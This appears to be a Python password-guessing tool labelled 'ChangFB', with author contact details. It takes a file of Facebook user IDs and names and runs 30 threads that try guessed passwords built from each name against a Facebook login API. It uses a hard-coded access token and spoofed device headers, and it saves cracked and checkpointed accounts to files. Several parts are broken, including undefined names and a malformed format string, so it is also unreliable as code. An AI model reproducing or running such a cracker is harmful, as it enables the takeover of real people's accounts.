#!/usr/bin/python
# -*- koding: utf-8 -*-

Owner     =  'Chang Cuters'
Facebook   =  'Facebook.com/ChangzFB'
WhatsApp     =  '0819-0776-1235 ᭄'

#####MODULE
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
from bs4 import BeautifulSoup as parser

#USER-AGENT
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

##### Colour
Z = "\x1b[0;90m"     
M = "\x1b[38;5;196m" 
H = "\x1b[38;5;46m"  
K = "\x1b[38;5;226m" 
B = "\x1b[38;5;44m"  
U = "\x1b[1;95m"     
I = "\x1b[1;96m"     
P = "\x1b[38;5;231m" 
J = "\x1b[38;5;208m" 
A = "\x1b[38;5;248m" 

#
try:
	import requests
except ImportError:
	print(f"{P}[✓]{M} pip install requests")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print(f"{P}[✓]{M} pip install bs4")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print(f"{P}[✓]{M} pip install futures")
	os.system("pip install futures")
host = ("https://mbasic.facebook.com")
B = random.choice([B,U,J,I])
#### Logo
def banner():
    war_dom = random.choice([A,K,I,J,U,H])
    print("""
       \033[47m\033[1;31m ꧁༒︎ChangFB༒︎꧂ \033[41m\033[1;37m ꧁༒︎Status : Premium༒︎꧂ \x1b[0m\n .d8888b.  888     888  .d8888b.   .d8888b. 8888888 \nd88P  Y88b 888     888 d88P  Y88b d88P  Y88b  888   \n888    888 888     888 888    888 888    888  888   \n888        888     888 888        888         888   \n888  88888 888     888 888        888         888   \n888    888 888     888 888    888 888    888  888   \nY88b  d88P Y88b. .d88P Y88b  d88P Y88b  d88P  888   \n "Y8888P88  "Y88888P"   "Y8888P"   "Y8888P" 8888888 \n       \033[47m\033[1;31m ꧁༒︎ WhatsApp \033[41m\033[1;37m ➳ 0819-0776-1235 ᭄༒︎꧂ \x1b[0m\n""")
## DATE TIME
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "July", "07": "Juli", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan_cek = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
os.system("git pull")
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

##### 
id = []
ok = []
cp = []
loop=0

### CLEAR TERMINAL
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
###GLOBAL URL & HEADERS
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/229.0.0.8.128;]"
owner_joke = 'Dont Love And Cry Just Fuck And Fly '
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

### CREATE FOLDER
def mkdir_data_login():
	# Owner
    try:os.mkdir("Original Written By Changcuters")
    except:pass
    # Joke
    try:os.mkdir("Dont Love And Cry Just Fuck And Fly")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass

######  MENU
def baloch():
    os.system("clear");banner()
    print(f"\033[41m\033[1;37mChanFB\x1b[0m\n  \x1b[38;5;231m[\033[33m1\x1b[38;5;231m]\x1b[38;5;248m Login Cookie")
    print(f"────────────────────────────────────────────────────")
    baloch123 = input(f"  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m PILIH : ")
    if baloch123 in ["0","00"]:
        exit()
    elif baloch123 in ["1","01"]:
    	os.system("clear");banner()
    	mk1()
    else:print(f'{M}  Dasar Bocil !!');os.system('xdg-open https://www.facebook.com/H4eckerfb')

def mk1():
			try:
				fileX = input ('\n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Masukan Cookie : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				fii_xd()
			except IOError:
				exit("\n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Cookie %s Error"%(fileX))

def fii_xd():
	mubashir()
	mrbaloch =input(f"  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Pilih : {P}")
	if mrbaloch in [""]:
		print(f"{B}[*]{M} Roung Input !!");os.system('xdg-open https://www.facebook.com/H4eckerfb')
	elif mrbaloch in ["1","01"]:
		print(f"{B} \n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Ingin Mulai Crack  {P}Y/t")
		_start_=input(f"{P}\n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Pilih : {P}")
		if _start_ in ["t","T"]:
			print(f"{B}   \n{M} Ok Godby !!");os.system('xdg-open https://www.facebook.com/H4eckerfb')
			
			
		else:
			print(f"{B} \n  \x1b[38;5;231m[\033[33m1\x1b[38;5;231m]\x1b[38;5;248m Crack Password Manual/Default {P}M/D")
			ter =input(f"{P}\n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Pilih : {P}")
			if ter in ["m","M"]:
				print(f"{B}   \n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Only Support default-Pass !!");os.system('xdg-open https://www.facebook.com/H4eckerfb')
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("|")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name ]
						elif len(frist)<=2:
							fii = [ name ]
						elif len(frist)<=3:
							fii = [ name ]
						else:
							fii = [ name ]

						coeg.submit(apiiii, uid, fii)
				exit()

	elif mrbaloch in ["3","03"]:
		print(f"{B} \n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Ingin Mulai Crack {P}Y/t")
		_start_=input(f"{P}\n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Pilih : {P}")
		if _start_ in ["t","T"]:
			print(f"{B}   \n{M} Ok Godby !!");os.system('xdg-open http://www.wasap.my/6281907761235')

		else:
			print(f"{B} \n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Crack Password Manual/Default {P}M/D")
			ter =input(f"{P}\n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Pilih : {P}")
			if ter in ["m","M"]:
				print(f"{B}   \n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Only Support default-Pass !!");os.system('xdg-open https://www.facebook.com/MUB4SH4R')
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("|")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
						elif len(frist)<=2:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
						elif len(frist)<=3:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
						else:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
						coeg.submit(apiiii, uid, fii)
				exit()
				
	elif mrbaloch in ["2","02"]:
		print(f"{B} \n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Ingin Mulai Crack {P}Y/t")
		_start_=input(f"{P}\n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Pilih : {P}")
		if _start_ in ["t","T"]:
			print(f"{B}   \n{M} Ok Godby !!");os.system('xdg-open https://www.facebook.com/H4eckerfb')

		else:
			print(f"{B} \n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Crack Password Manual/Default {P}M/D")
			ter =input(f"{P}\n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Pilih : {P}")
			if ter in ["m","M"]:
				print(f"{B}   \n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Only Support default-Pass !!");os.system('xdg-open https://www.facebook.com/MUB4SH4R')
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("|")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
						elif len(frist)<=2:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
						elif len(frist)<=3:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
						else:
							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
						coeg.submit(apiiii, uid, fii)
				exit()
				
def mubashir():
	
    print(f"{B}  \x1b[38;5;231m[\033[33m1\x1b[38;5;231m]\x1b[38;5;248m Crack Dengan Hanya Name Pass \x1b[38;5;231m[\x1b[0;34mV-FAST\x1b[38;5;231m]")
    print(f"{B}  \x1b[38;5;231m[\033[33m2\x1b[38;5;231m]\x1b[38;5;248m Crack Dengan Nama+Digit Pass \x1b[38;5;231m[\x1b[0;34mLAMBAT\x1b[38;5;231m]")
    print(f"{B}  \x1b[38;5;231m[\033[33m3\x1b[38;5;231m]\x1b[38;5;248m Crack Dengan Nama+Digit + Pass \x1b[38;5;231m[\x1b[0;34mV-LAMBAT\x1b[38;5;231m]\n")

def started():
	
    os.system("clear");banner();print(f"{B} \n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Total id : {P}{len(id)}\x1b[92;1m\n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Gunakan Mode Penerbangan Sebelum Digunakan\n  \x1b[38;5;231m[\033[33m+\x1b[38;5;231m]\x1b[38;5;248m Salam Cracker Dari Mr.Chang Cutets\n────────────────────────────────────────────────────")
    print(f"{B} {P}")

def apiiii(uid, fii):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"
    global ok, cp, loop, token, cookie

    sys.stdout.write(f"\r{B}  \x1b[38;5;231m[🔋\x1b[38;5;231m]\x1b[38;5;248m{P} {loop}|{len(id)} {H}[OK:{H}{len(OK)}]");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{H}  [√] {H}{uid}|{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token  = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{H}  [×] {H}{uid}|{pw}•{day} {mont} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.json%"(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            print(f"\r{H}  \033[0;96m{H}[×] {H}\033[0;96m{uid}|{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

#Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36
#Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36
#Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36

if __name__=="__main__":
    os.system("clear")
    mkdir_data_login()
    ChangFB()
